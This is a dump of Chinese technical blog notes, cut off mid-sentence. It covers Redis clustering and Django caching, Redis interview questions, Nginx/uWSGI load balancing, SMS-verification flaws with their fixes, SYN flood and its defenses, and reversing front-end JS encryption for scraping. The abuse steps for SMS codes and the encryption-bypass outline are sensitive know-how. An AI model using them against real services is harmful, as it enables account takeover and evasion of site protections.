将多台redis服务器组成集群，分担负载。相对于主从架构，是进一步的扩展和升级。集群中的多台主服务器同时对外提供读写功能，并分担整体的负载压力。而且每台主服务器都还会有自己的从服务器，作为数据副本，也作为主服务器的候补，当主服务器意外崩溃，则从服务器自动成为主服务器，保证了整个集群的高可用性。 在负载压力分担，和系统的高可用性上，集群是很好的解决方案 。 二、集群搭建1、配置集群服务器 启动至少6个redis服务器（3主3从），每台服务器在配置中要增加： 12345cluster-enabled yes #开启集群支持cluster-config-file nodes.conf #记录节点信息bind 0.0.0.0 #开放所有ip 以各自的配置开启所有服务器 123456redis-server 7001/redis.confredis-server 7002/redis.confredis-server 7003/redis.confredis-server 7004/redis.confredis-server 7005/redis.confredis-server 7006/redis.conf 2、创建redis集群2.1 创建Redis集群1redis-cli --cluster create 192.168.134.124:7001 192.168.134.124:7002 192.168.134.124:7003 192.168.134.124:7004 192.168.134.124:7005 192.168.134.124:7006 --cluster-replicas 1 --cluster-replicas 1 表示主从复制比例为 1:1，即一个主节点对应一个从节点；然后，默认给我们分配好了每个主节点和对应从节点服务器，以及 slot 的大小，因为在 Redis 集群中有且仅有 16384 个 slot ，默认情况会给我们平均分配，当然你可以指定，后续的增减节点也可以重新分配。 查看集群信息：192.168.134.124:7003&gt; cluster info(查看集群信息),cluster nodes(查看节点列表) 至此，集群搭建完毕，6个节点，3主，3从，只有主节点才拥有槽，并对外提供读写数据服务。注意至少有3个主节点才可以搭建集群，为每个主至少分配1个从，所以至少需要6个redis节点才可以形成集群。 2.3 槽 redis cluster 默认分配了 16384 个slot，所有的主redis服务器，大概均分所有的槽 存&#x2F;取值时 ，redis会根据key，计算一个介于 0 – 16383之间的数字，此数字即为当前数据的槽位置，通过槽位置，决定哪个redis主服务器来负责本次访问 所有的读写操作都会交给redis的主服务器，现在有3台redis的主服务器，来了数据请求之后，具体由哪一台redis的主服务器负责提供服务呢？ set name Tom name经过hash算法算出一个介于0-16383之间的数字 5798 set age 18 age经过hash算法算出0-16383 741 Redis 集群会把数据存在一个master节点，然后在这个master和其对应的slave之间进行数据同步。当读取数据时，也根据一致性哈希算法到对应的master节点获取数据。只有当一个master 挂掉之后，才会启动一个对应的slave节点，充当master。 需要注意的是：必须要3个或以上的主节点，否则在创建集群时会失败，并且当存活的主节点数小于总节点数的一半时，整个集群就无法提供服务了。 2.4 集群说明 集群搭建后： 性能的进一步提升，可以在单位时间内，吞吐更多的请求 数据的存储节点，具有高可用性(集群有好的容错机制) 集群容错： 所有槽可以被覆盖时，则集群正常运行 如果16384个槽，不能被所有主机完整覆盖了，则集群宕机 三、集群节点操作1、从节点操作1.1 添加从节点12345redis-cli --cluster add-node 192.168.134.124:7000 192.168.134.124:7001 --cluster-slave --cluster-master-id 4032891b648e76b2975e5bc701e9c8a52ad6f3dd# 注意：加新节点之前 要清楚新节点中数据# add-node: 后面的分别跟着新加入的slave和集群中任意一个节点# cluster-slave：表示加入的是slave节点# --cluster-master-id：表示slave对应的master的node ID 1.2 删除从节点12 #集群中已存在的节点ip:port #要删除的节点的idredis-cli --cluster del-node 192.168.134.124:7003 875e192f647ccf06ce6b1d92e15df31a2286dbbf 2、主节点操作2.1 添加主节点12redis-cli --cluster add-node 192.168.134.124:7000 192.168.134.124:7006 #新增加的主节点 #一个已存在的节点 将7006添加到7001所在集群中，成为一个主节点，但此时它不持有任何槽，需要重新分片 2.2 重新分片1redis-cli --cluster reshard 192.168.134.124:7000 分出去的槽，从之前拥有操作的所有主节点中获取。","categories":[{"name":"redis","slug":"redis","permalink":"http://example.com/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://example.com/tags/redis/"}]},{"title":"redis和python","slug":"Redis_03","date":"2020-11-20T01:41:29.000Z","updated":"2024-03-15T07:11:15.740Z","comments":true,"path":"2020/11/20/Redis_03/","permalink":"http://example.com/2020/11/20/Redis_03/","excerpt":"Redis数据库的学习笔记","text":"Redis数据库的学习笔记 Python-Redis一、安装模块在虚拟环境中安装以下几个模块： pip install redis #安装redis模块 pip install redis-py-cluster #支持python连接redis集群 pip install django-redis==4.8.0 #支持django 二、连接Redis1、连接12from redis import Redisred = Redis(host=&#x27;192.168.134.124&#x27;,port=8000) # 连接redis数据库 123456789red.set(&quot;name&quot;,&quot;Mr_lee&quot;)red.set(&quot;age&quot;,18)age = red.get(&quot;age&quot;)print(age)red.lpush(&quot;hobby&quot;,&quot;football&quot;,&quot;basketball&quot;)hobby = red.lrange(&quot;hobby&quot;,0,-1)print(hobby) 2、Json序列化存储 读取MySQL数据库中的数据，转存到Redis数据库中 1序列化过程：获取Model数据 -&gt; 序列化为json字符串 -&gt; set存储到redis数据库 123456789101112131415import jsonfrom redis import Redisfrom datetime import datetimered = Redis(host=&#x27;192.168.134.124&#x27;,port=8000) # 连接redis数据库def mydefault(u): if isinstance(u,User): return &#123;&quot;name&quot;:u.name,&#x27;age&#x27;:u.age,&#x27;salary&#x27;:u.salary,&#x27;birthday&#x27;:u.birthday.strftime(&#x27;%Y-%m-%d&#x27;)&#125;users = list(User.objects.all()) # 查询mysql数据库中的user-&gt;QuerySet，并转为listuser_dump = json.dumps(users,default=mydefault) # 将model数据 转为 json字符串print(user_dump)red.set(&#x27;userlist&#x27;,user_dump) # 将json字符串以key-value的形式存储到redis中 3、反序列化1反序列化过程：获取redis数据库中的数据get -&gt; json字符串 -&gt; 提取字符串中的数据（反序列化） -&gt; Model对象 123456def parsedefault(dic): # u为list中的一个个dict return User(name=dic[&#x27;name&#x27;],age=dic[&#x27;age&#x27;],salary=dic[&#x27;salary&#x27;],birthday=dic[&#x27;birthday&#x27;])res = red.get(&quot;userlist&quot;) # 返回bytes 需转为str b&quot;xxx&quot;.decode(&quot;utf-8&quot;) -&gt; strresults = json.loads(res.decode(&quot;utf-8&quot;),object_hook=parsedefault)print(results) 三、Python-Redis集群12345678910111213from rediscluster import RedisClustercluster_nodes = [ &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7001&#125;, &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7002&#125;, &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7003&#125;, &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7004&#125;, &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7005&#125;, &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7006&#125;,]cluster = StrictRedisCluster(startup_nodes=cluster_nodes)cluster.set(&#x27;name&#x27;,&#x27;Mr_lee&#x27;) # key 0-16383 四、Django-Redis缓存1、缓存的概念在实际Web开发中，经常需要在客户端和服务器端进行数据传输： 客户端发送请求，服务器端接收请求，返回数据 而在返回数据之前，我们要对数据库进行查询操作，找到正确的请求内容 如果要查找的数据量比较大，每次请求的耗时将会是一个非常可怕的事情。 这个时候，我们就需要对某些无需实时更新的内容进行缓存处理，把要返回的内容存放在缓存中，收到数据请求后直接把缓存中的数据返回，如果缓存不存在，则查询数据库，并且把内容添加进缓存中，以便下次请求使用。 简单来说：缓存就是把一些查询频繁且改动较少的数据，放入一个内存区域临时存储，进而在一定程度上改善查询的性能。 2、缓存流程初次查询，依然找到磁盘数据库，然后会将查询结果返回并纳入缓存； 之后的每次相同的查询都可以直接从缓存取数据，则可以达到 “较少与磁盘数据库通信次数” 的目的。 如果缓存失效，则再次回到数据库查询，并存入缓存。重复上述过程 数据存储在Mysql中，查询到数据后，返回给客户端，同时将数据存储入redis数据库中（redis就是内存数据库） 3、Redis缓存配置3.1 安装django-redispip install django-redis 3.2 设置缓存在Django项目的settings.py中添加如下设置： 123456789CACHES = &#123; &quot;default&quot;: &#123; &quot;BACKEND&quot;: &quot;django_redis.cache.RedisCache&quot;, #Redis缓存入口，其中使用DefaultClient操作缓存 &quot;LOCATION&quot;: &quot;redis://192.168.134.124:8000/3&quot;, #ip:port/db_index &quot;OPTIONS&quot;: &#123; &quot;CLIENT_CLASS&quot;: &quot;django_redis.client.DefaultClient&quot; #操作缓存的对象 &#125; &#125;&#125; 4、view缓存实际要缓存的应该是查询到的数据，但是数据最终会通过模板文件html来显示 view缓存是将整个的模板文件加入到缓存中 1234@cache_page(timeout=10,key_prefix=&quot;cacheRedis&quot;) # timeout 缓存时效(秒)def index(request): users = User.objects.all() return render(request,&#x27;redis_app/index.html&#x27;,&#123;&quot;users&quot;:users&#125;) 加在会渲染模板的视图函数上，会将整个模板的渲染结果存入缓存 5、template缓存在模板中使用缓存，可以充分考虑缓存的颗粒度，细分颗粒度，可以保存只缓存部分HTML片段，而不是整个模板文件。 12345678910111213141516171819&lt;!DOCTYPE html&gt;&#123;% load cache %&#125; # 加载cache&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &#123;% cache 100 cache_1 %&#125; # 要缓存的区域--开始 缓存时间100s &#123;% for u in users %&#125; &#123;&#123; u.name &#125;&#125; &#123;% endfor %&#125; &#123;% endcache %&#125; # 要缓存的区域--结束 &lt;/body&gt;&lt;/html&gt; 6、缓存删除当数据库的数据发生改动时，需要删除缓存 123456789101112from django.core.cache import cache---------------------------------------------------------------------keys = cache.keys(&quot;*abc*&quot;)#获取包含abc的所有keyfor key in keys: #遍历key cache.delete(key) #删除某个key-----------------------------------------------------------------------cache.delete_many(keys) #删除多个key--------------------------------------------------------------- cache.delete_pattern(&quot;*abc*&quot;) #删除包含abc的所有key--------------------------------------------------------------- cache.clear() #清空当前db的所有key 7、Session存储将session存入缓存，可以提高session数据的交互效率 12#django.contrib.sessions.backends.cached_db -- 缓存和数据库中并存SESSION_ENGINE=&#x27;django.contrib.sessions.backends.cache&#x27; #存于缓存","categories":[],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}]},{"title":"redis面试题","slug":"redis面试题","date":"2020-11-20T01:41:29.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/11/20/redis面试题/","permalink":"http://example.com/2020/11/20/redis%E9%9D%A2%E8%AF%95%E9%A2%98/","excerpt":"redis面试题","text":"redis面试题 redis面试题 redis数据类型 12345678910111213141516171819202122232425262728293031# String字符串：格式: set key valuestring类型是二进制安全的。意思是redis的string可以包含任何数据。比如jpg图片或者序列化的对象 。string类型是Redis最基本的数据类型，一个键最大能存储512MB。# Hash（哈希）格式: hmset name key1 value1 key2 value2Redis hash 是一个键值(key=&gt;value)对集合。Redis hash是一个string类型的field和value的映射表，hash特别适合用于存储对象。# List（列表）Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）格式: lpush name value在 key 对应 list 的头部添加字符串元素格式: rpush name value在 key 对应 list 的尾部添加字符串元素格式: lrem name indexkey 对应 list 中删除 count 个和 value 相同的元素格式: llen name 返回 key 对应 list 的长度# Set（集合）格式: sadd name valuRedis的Set是string类型的无序集合。集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。# zset(sorted set：有序集合)格式: zadd name score valueRedis zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。zset的成员是唯一的,但分数(score)却可以重复。 Redis持久化 1234567891011121314151617持久化就是把内存的数据写到磁盘中去，防止服务宕机了内存数据丢失。两种持久化方式:RDB（默认）快照 和AOF 日志# 比较1、aof文件比rdb更新频率高，优先使用aof还原数据。2、aof比rdb更安全也更大3、rdb性能比aof好4、如果两个都配了优先加载AOF## RDB：Redis DataBase功能核心函数rdbSave(生成RDB文件)和rdbLoad（从文件加载内存）两个函数## AOF: Append-only file每当执行服务器(定时)任务或者函数时flushAppendOnlyFile 函数都会被调用， 这个函数执行以下两个工作aof写入保存：WRITE：根据条件，将 aof_buf 中的缓存写入到 AOF 文件SAVE：根据条件，调用 fsync 或 fdatasync 函数，将 AOF 文件保存到磁盘中 redis通讯协议RESP 1234567# RESP 是redis客户端和服务端之前使用的一种通讯协议；# RESP 的特点：实现简单、快速解析、可读性好For Simple Strings the first byte of the reply is &quot;+&quot; 回复For Errors the first byte of the reply is &quot;-&quot; 错误For Integers the first byte of the reply is &quot;:&quot; 整数For Bulk Strings the first byte of the reply is &quot;$&quot; 字符串For Arrays the first byte of the reply is &quot;*&quot; 数组 Redis 有哪些架构模式？讲讲各自的特点 1234567891011121314151617181920212223242526272829303132333435363738394041424344# 单机版特点：简单问题：1、内存容量有限 2、处理能力有限 3、无法高可用。# 主从复制Redis 的复制（replication）功能允许用户根据一个 Redis 服务器来创建任意多个该服务器的复制品，其中被复制的服务器为主服务器（master），而通过复制创建出来的服务器复制品则为从服务器（slave）。 只要主从服务器之间的网络连接正常，主从服务器两者会具有相同的数据，主服务器就会一直将发生在自己身上的数据更新同步 给从服务器，从而一直保证主从服务器的数据相同。特点：1、master/slave 角色2、master/slave 数据相同3、降低 master 读压力在转交从库问题：无法保证高可用没有解决 master 写的压力# 哨兵Redis sentinel 是一个分布式系统中监控 redis 主从服务器，并在主服务器下线时自动进行故障转移。其中三个特性：监控（Monitoring）：Sentinel 会不断地检查你的主服务器和从服务器是否运作正常。提醒（Notification）： 当被监控的某个 Redis 服务器出现问题时， Sentinel 可以通过 API 向管理员或者其他应用程序发送通知。自动故障迁移（Automatic failover）： 当一个主服务器不能正常工作时， Sentinel 会开始一次自动故障迁移操作。特点：1、保证高可用2、监控各个节点3、自动故障迁移缺点：主从模式，切换需要时间丢数据没有解决 master 写的压力# 集群（proxy 型）：Twemproxy 是一个 Twitter 开源的一个 redis 和 memcache 快速/轻量级代理服务器； Twemproxy 是一个快速的单线程代理程序，支持 Memcached ASCII 协议和 redis 协议。特点：1、多种 hash 算法：MD5、CRC16、CRC32、CRC32a、hsieh、murmur、Jenkins 2、支持失败节点自动删除3、后端 Sharding 分片逻辑对业务透明，业务方的读写方式和操作单个 Redis 一致缺点：增加了新的 proxy，需要维护其高可用。failover 逻辑需要自己实现，其本身不能支持故障的自动转移可扩展性差，进行扩缩容都需要手动干预# 集群（直连型）：从redis 3.0之后版本支持redis-cluster集群，Redis-Cluster采用无中心结构，每个节点保存数据和整个集群状态,每个节点都和其他所有节点连接。特点：1、无中心架构（不存在哪个节点影响性能瓶颈），少了 proxy 层。2、数据按照 slot 存储分布在多个节点，节点间数据共享，可动态调整数据分布。3、可扩展性，可线性扩展到 1000 个节点，节点可动态添加或删除。4、高可用性，部分节点不可用时，集群仍可用。通过增加 Slave 做备份数据副本5、实现故障自动 failover，节点之间通过 gossip 协议交换状态信息，用投票机制完成 Slave到 Master 的角色提升。缺点：1、资源隔离性较差，容易出现相互影响的情况。2、数据通过异步复制,不保证数据的强一致性 Redis常用命令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Keys pattern*表示区配所有以bit开头的查看Exists key是否存在Set设置 key 对应的值为 string 类型的 value。setnx设置 key 对应的值为 string 类型的 value。如果 key 已经存在，返回 0，nx 是 not exist 的意思。删除某个key第一次返回1 删除了 第二次返回0Expire 设置过期时间（单位秒）TTL查看剩下多少时间返回负数则key失效，key不存在了Setex设置 key 对应的值为 string 类型的 value，并指定此键值对应的有效期。Mset一次设置多个 key 的值，成功返回 ok 表示所有的值都设置了，失败返回 0 表示没有任何值被设置。Getset设置 key 的值，并返回 key 的旧值。Mget一次获取多个 key 的值，如果对应 key 不存在，则对应返回 nil。Incr对 key 的值做加加操作,并返回新的值。注意 incr 一个不是 int 的 value 会返回错误，incr 一个不存在的 key，则设置 key 为 1incrby同 incr 类似，加指定值 ，key 不存在时候会设置 key，并认为原来的 value 是 0Decr对 key 的值做的是减减操作，decr 一个不存在 key，则设置 key 为-1Decrby同 decr，减指定值。Append给指定 key 的字符串值追加 value,返回新字符串值的长度。Strlen取指定 key 的 value 值的长度。persist xxx(取消过期时间)选择数据库（0-15库）Select 0 //选择数据库move age 1//把age 移动到1库Randomkey随机返回一个keyRename重命名Type 返回数据类型 什么是缓存穿透？如何避免？什么是缓存雪崩？何如避免？ 123456789101112131415# 缓存穿透一般的缓存系统，都是按照key去缓存查询，如果不存在对应的value，就应该去后端系统查找（比如DB）。一些恶意的请求会故意查询不存在的key,请求量很大，就会对后端系统造成很大的压力。这就叫做缓存穿透。# 如何避免？1：对查询结果为空的情况也进行缓存，缓存时间设置短一点，或者该key对应的数据insert了之后清理缓存。2：对一定不存在的key进行过滤。可以把所有的可能存在的key放到一个大的Bitmap中，查询时通过该bitmap过滤。# 缓存雪崩当缓存服务器重启或者大量缓存集中在某一个时间段失效，这样在失效的时候，会给后端系统带来很大压力。导致系统崩溃。# 如何避免？1：在缓存失效后，通过加锁或者队列来控制读数据库写缓存的线程数量。比如对某个key只允许一个线程查询数据和写缓存，其他线程等待。2：做二级缓存，A1为原始缓存，A2为拷贝缓存，A1失效时，可以访问A2，A1缓存失效时间设置为短期，A2设置为长期3：不同的key，设置不同的过期时间，让缓存失效的时间点尽量均匀。","categories":[],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://example.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"}]},{"title":"使用pycharm导出虚拟环境依赖包","slug":"使用pycharm导出虚拟环境依赖包","date":"2020-11-09T01:20:57.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/11/09/使用pycharm导出虚拟环境依赖包/","permalink":"http://example.com/2020/11/09/%E4%BD%BF%E7%94%A8pycharm%E5%AF%BC%E5%87%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BE%9D%E8%B5%96%E5%8C%85/","excerpt":"","text":"导出 1pip freeze &gt; requirements.txt 安装 1pip install -r requirements.txt","categories":[],"tags":[{"name":"Pycharm","slug":"Pycharm","permalink":"http://example.com/tags/Pycharm/"}]},{"title":"短信验证码常见漏洞","slug":"短信验证码常见漏洞","date":"2020-11-09T00:59:33.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/11/09/短信验证码常见漏洞/","permalink":"http://example.com/2020/11/09/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/","excerpt":"短信轰炸漏洞,验证码未与手机号绑定,验证码暴力破解漏洞,客户端验证绕过","text":"短信轰炸漏洞,验证码未与手机号绑定,验证码暴力破解漏洞,客户端验证绕过 一：短信轰炸漏洞 发送短信接口是最容易被盗刷的接口，不法分子利用接口的漏洞，任意的发送短信，给企业造成直接的经济损失。因此这个要特别注意，主要防御手段有四： （一）同一个手机号限制每日发送短信条数； （二）限制发送短信间隔，通常限制是 60秒，在客户端设置60秒倒计时没什么用，在服务端也要做； （三）给接口加签名验证增加破解接口的难度。 （四）限制ip日发送短信条数 二：验证码未与手机号绑定 验证码未与手机号绑定的话，就会发生这样的情况，A的验证码B可以用，这样是非常不安全的 （一）任意用户注册漏洞 可以使用任意手机号进行注册，操作步骤如下：1.在注册界面，输入自己的手机号；2.发送验证码，拿到验证码，然后退出登录界面；3.重新进入注册界面，输入任意人的手机号，输入刚才拿到的自己的验证码，注册成功。 （二）任意用户密码重置漏洞 可以任意修改任何账号的密码，操作步骤如下：1.在忘记密码界面，输入自己的手机号；2.发送验证码，拿到验证码，然后退出忘记密码界面；3.输入其他人的手机号，输入自己的验证码，验证成功，修改别人的密码成功。 解决之道，唯有在服务端校将验证码与手机号绑定。 三：验证码暴力破解漏洞 验证码一般由4位或6位数字组成，4位的话，最多尝试1万次就能破解验证码，所以应对验证次数进行限制，同时应该设置验证码的过期时间（5分钟或15分钟失效），防止暴力破解验证码。 四：客户端验证绕过 在客户端校验验证码是不安全的，必须在服务端进行验证，否则容易造成任意用户注册、任意修改密码、任意登陆等一系列问题。","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"HTTP","slug":"Http的了解","date":"2020-11-07T08:19:49.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/11/07/Http的了解/","permalink":"http://example.com/2020/11/07/Http%E7%9A%84%E4%BA%86%E8%A7%A3/","excerpt":"http工作原理,TCP 的三次握手客户端,四次挥手….","text":"http工作原理,TCP 的三次握手客户端,四次挥手…. http工作原理12345671.地址进行dns解析,将url解析出对应的内容2.封装http请求数据包3.封装成tcp包,建立tcp连接(tcp的三次握手)4.客户端发送请求5.服务器接收请求,发送响应6.客户端接收响应,进行页面渲染7.服务器关闭TCP连接(TCP的四次挥手) TCP 的三次握手客户端12341. 第一次握手:建立连接时,客户端发送syn包到服务器,并进入syn_sent状态,等待服务器确认;syn:同步序列编号2. 第二次握手: 服务器收到syn包,必须确认客户的syn(ack=j+1),同时自己发送一个syn包(seq=k),即syn+ack包每次是服务器进入syn_recv状态3. 第三次握手:客户端收到服务器的syn+ack包,向服务器发送确认包ack(ack=k+1),此包发送完毕,客户端和服务端进入连接成功状态 三次握手缺点123syn-flood攻击是最常见的DDoS攻击,也是最经典的拒绝服务攻击. 利用TCP协议实现的一个缺陷,通过像网络服务所在端口发送大量伪造源地址的攻击报文,就可能造成目标服务器中的半开连接队被沾满,从而阻止其他合法用户进行访问. 数据包特征: 源发送了大量的syn包,并缺少了三次握手的最后一步握手ack回复 1234567891011121314原理：攻击者首先伪造地址对 服务器发起SYN请求，服务器回应(SYN+ACK)包，而真实的IP会认为，我没有发送请求，不作回应。服务器没有收到回应，这样的话，服务器不知道(SYN+ACK)是否发送成功，默认情况下会重试5次（tcp_syn_retries)这样的话，对于服务器的内存，带宽都有很大的消耗。攻击者如果处于公网，可以伪造IP的话，对于服务器就很难根据IP来判断攻击者，给防护带来很大的困难。 解决办法: 1． 无效连接监视释放 这种方法不停的监视系统中半开连接和不活动连接，当达到一定阈值时拆除这些连接，释放系统资源。 2． 延缓TCB分配方法 SYN Flood关键是利用了，SYN数据报文一到，系统立即分配TCB资源，从而占用了系统资源，因此有俩种技术来解决这一问题 Syn Cache技术 这种技术在收到SYN时不急着去分配TCB，而是先回应一个ACK报文，并在一个专用的HASH表中（Cache）中保存这种半开连接，直到收到正确的ACK报文再去分配TCB Syn Cookie技术 Syn Cookie技术则完全不使用任何存储资源，它使用一种特殊的算法生成Sequence Number，这种算法考虑到了对方的IP、端口、己方IP、端口的固定信息，以及对方无法知道而己方比较固定的一些信息，如MSS、时间等，在收到对方 的ACK报文后，重新计算一遍，看其是否与对方回应报文中的（Sequence Number-1）相同，从而决定是否分配TCB资源。 3.使用SYN Proxy防火墙 原理：对试图穿越的SYN请求进行验证之后才放行 四次挥手1234第一步，当主机A的应用程序通知TCP数据已经发送完毕时，TCP向主机B发送一个带有FIN附加标记的报文段（FIN表示英文finish）第二步，主机B收到这个FIN报文段之后，并不立即用FIN报文段回复主机A，而是先向主机A发送一个确认序号ACK，同时通知自己相应的应用程序：对方要求关闭连接（先发送ACK的目的是为了防止在这段时间内，对方重传FIN报文段）第三步，主机B的应用程序告诉TCP：我要彻底的关闭连接，TCP向主机A送一个FIN报文段第四步，主机A收到这个FIN报文段后，向主机B发送一个ACK表示连接彻底释放 Http协议和Https协议的区别12345HTTP协议是使用明文数据传输的网络协议，明文传输会让用户存在一个非常大的安全隐患。端口80HTTPS协议可以理解为HTTP协议的安全升级版，就是在HTTP的基础上增加了数据加密。端口443HTTPS协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议要比HTTP协议安全。 HTTP协议特点1234- HTTP协议是超文本传输协议；- HTTP协议是一个应用层协议；- 无连接：每次请求都是独立的；- 无状态，表示客户端每次请求都不能记录请求状态，就是两条请求直接不可通信。","categories":[],"tags":[{"name":"Http","slug":"Http","permalink":"http://example.com/tags/Http/"}]},{"title":"js加密破解","slug":"js加密破解","date":"2020-11-01T02:29:08.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/11/01/js加密破解/","permalink":"http://example.com/2020/11/01/js%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/","excerpt":"1.前端加密 2.后端加密 3.加密算法","text":"1.前端加密 2.后端加密 3.加密算法 js加密破解分类1234561.前端加密 加密逻辑在前端2.后端加密 加密逻辑在后台,一般直接使用加密算法经行加密操作3.加密算法 Base64,Hex编码,MD5,AES,HASH,DES,RSA等 前端加密1234567891011121314151617181920破解思路 1.找到加密的逻辑代码 a.用python代码模拟加密过程 b.使用python第三方库执行js代码 直接执行js,生成对应的值 execjs 2.js加密分类 A.常规js代码加密 B.js压缩 把js代码中不必要的空格,换行等内容去除掉使得源码压缩为一行,降低代码的可读性,也可以防止断点调试,同时提高网站的加载速度,不方便后期维护 C.js混淆 对js代码进行混淆处理 可以使用变量替换,字符串阵列化,控制流平坦化,僵尸代码,调试保护等手段,使得源码变得难以阅读和分析,但不会影响代码的原有功能 D.js代码加密 将js逻辑使用c/c++等语言编写,通过js调用执行,从而达到二进制的防护作用 3.找不到js加密逻辑 使用无头浏览器 selenium 速度慢 pyppeteer selenium无头浏览器12341. 是一个自动化测试的工具 可以使用代码操作,类似于按键精灵2. 采集效率极低,消耗资源大,是一个浏览器内核,基本就相当于浏览器,可以获取浏览器上能获取到的数据.3. 需要通过驱动来操作浏览器","categories":[],"tags":[{"name":"Js加密破解","slug":"Js加密破解","permalink":"http://example.com/tags/Js%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/"}]},{"title":"Nginx服务器","slug":"Nginx服务器","date":"2020-10-29T06:18:30.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/10/29/Nginx服务器/","permalink":"http://example.com/2020/10/29/Nginx%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"Nginx服务器,nginx与uWSGI,集群和负载均衡策略,uWSGI服务器","text":"Nginx服务器,nginx与uWSGI,集群和负载均衡策略,uWSGI服务器 Nginx服务器一、Nginx概述1、简介Nginx是一款轻量级的web服务器&#x2F;反向代理服务器,占内存小,并发能力强. 作用123静态http服务器(处理静态资源-动静分离):首先,Nginx是http服务器,可以上传静态资源(图片,css,js文件)通过http协议展示给客户端.将静态资源交给nginx服务器 Nginx提供动静分离是指动态的请求和静态的请求分离开,合适的服务器处理合适的请求,使整个服务系统的性能,效率更高 uWSGI更适合做动态内容的执行,nginx更适合做静态内容的处理,客户端请求直接访问nginx服务器,留下静态部分处理,动态部分转发给uWSGI服务器,实现”动静分离” 反向代理服务器反向代理是指代理服务器nginx来接受internet上的请求,然后将请求转发给内部网络上的其他服务器uWSGI,并将uWSGI服务器上的得到的结果返回给Internet上请求的客户端,此时代理服务器对外表现为反向代理服务器. 代理均衡多在高并发情况下需要使用,原理时将数据流量分摊成多个服务器执行,减轻每台服务器的压力,多服务器(集群)共同完成工作任务,从而提高数据的吞吐量. 2、安装步骤 将tar包发送的linux 解压 tar -zxvf nginx-1.11.1.tar.gz 安装依赖 yum install gcc zlib-devel pcre-devel cd到解压目录：./configure #配置检测 cd到解压目录：make &amp;&amp; make install #编译并安装 安装完成，安装路径为/usr/local/nginx ,日志路径为 /usr/local/nginx/logs , 可执行文件路径为 /usr/local/nginx/sbin ,配置文件路径为 /usr/local/nginx/conf 欢迎页面路径为 /usr/local/nginx/html ln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx 制作连接，便于执行nginx指令 nginx #启动nginx -s stop #关闭nginx -s reload #重启 http://ip:80即可访问nginx欢迎页面 二、nginx与uWSGInginx配置–到配置路径中的nginx.conf /usr/local/nginx/conf/nginx.conf 1234567891011121314151617181920upstream ems&#123; server 192.168.157.141:9001; # uWSGI&#x27;s socket = #server 192.168.157.142:9001; #192.168.x.x:9001 #可以在添加其他的uWSGI的服务器&#125;server &#123; listen 80; server_name 192.168.157.142; # nginx服务器的ip charset utf-8; location / &#123; uwsgi_pass ems; #和上面的upstream转接 include /usr/local/nginx/conf/uwsgi_params; # the uwsgi_params file you installed &#125; location /static &#123; #http://ip:80/static/a/b/c/d.png ==&gt; /usr/local/static/a/b/c/d.png alias /usr/local/static; # your Django project&#x27;s static files - amend as required &#125; ...｝ 配置好后，重启nginx即可，可以使用Nginx服务器来访问项目 注意关闭防火墙！！ 两台虚拟主机，一个运行nginx，其中保存project的静态资源；一个运行uwsgi，其中保存并部署project。 三、集群和负载均衡策略搭建uWSGI集群，只需要多做几份uWSGI的配置文件，文件中设置不同的ip:port，指向相同的project，然后启动多个uWSGI即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243*默认:轮询 upstream django &#123; server 192.168.0.103:8989; server 192.168.0.104:8989; &#125;*iphash:基于ip的负载均衡. upstream django &#123; ip_hash; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125;*权重轮询: upstream django &#123; server 192.168.0.103:8989 weight=1; server 192.168.0.104:8990 weight=2; &#125;*最小连接数： upstream django &#123; least_conn; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125;*默认:轮询 upstream django &#123; server 192.168.0.103:8989; server 192.168.0.104:8989; &#125;*iphash:基于ip的负载均衡. upstream django &#123; ip_hash; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125;*权重轮询: upstream django &#123; server 192.168.0.103:8989 weight=1; server 192.168.0.104:8990 weight=2; &#125;*最小连接数： upstream django &#123; least_conn; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125; 至此，一个uWSGI集群搭建完成，nginx作为反向代理服务器和web服务器接收请求，然后处理静态的部分，动态部分按照负载均衡策略转发给某一个uWSGI服务器。 四、uWSGI服务器1、WSGI协议 使用Django或Flask框架编写的Web应用程序，在python manage.py runserver 